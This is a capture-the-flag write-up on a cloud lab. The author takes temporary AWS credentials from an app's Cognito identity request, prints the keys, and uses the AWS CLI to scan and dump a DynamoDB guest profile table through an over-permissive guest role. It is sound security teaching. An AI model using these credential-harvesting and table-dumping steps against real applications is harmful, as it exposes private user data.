#Cloud #AWS #Cognito #IAMMisconfiguration

We get the URL: 
`http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/`

Which leads me to my `free wellness dashboard`.

![temp](assets/20260806132545.png)

"Loading your dashboard...".

Lets look at the network traffic.

When intercepting the connection in burpsuite I find this POST request being sent over and over again, it contains a `TableName`: 
```
{"TableName":"complimentary-GuestWellnessProfiles","Key":{"guest_id":{"S":"guest-ws5sv9fz"}}}
```
This means we send a `POST` request with this payload over and over again. It could be to register the user `guest-ws5sv9fz` into the table `GuestWellnessProfiles`.


I also intercept another POST request which has this payload: 
```json
{"IdentityId":"us-east-1:4d571309-b012-ca84-bf20-31e12132414e"}
```
When sending this, the response contains `credentials`.

We have:
* **AccessKeyID**: ASIAU2VYTBGYOENDOISN
* **Expiration**: ...1E9
* **SecretKey**: /FXnB8ds8Vhm3snqrP9DD+GWRV47s+KPMiI0z+9k
* **SessionToken**: looooong string

```bash
export AWS_ACCESS_KEY_ID=<access_key>
export AWS_SECRET_ACCESS_KEY=<secret_key>
export AWS_SESSION_TOKEN=<session_token>

aws dynamodb describe-table --table-name complimentary-GusetWellnessProfiles --endpoint-url http://dynamodb.us-east-1.amazonaws.com
```
The endpoint url is gotten from the repeating POST request, which is the dynamodb URL. It is the back-end database for this web app.

For this command ^ I got an "AccessDeniedException".

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --endpoint-url http://dynamodb.us-east-1.amazonaws.com
```
This dumps the entire user table!

We can find the flag under `guest-lambo` -> `notes`.

```
If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}
```
The misconfiguration is that the guest role can scan entire tables. We got an AccessDeniedException for `describing` a table, but not for scanning it.
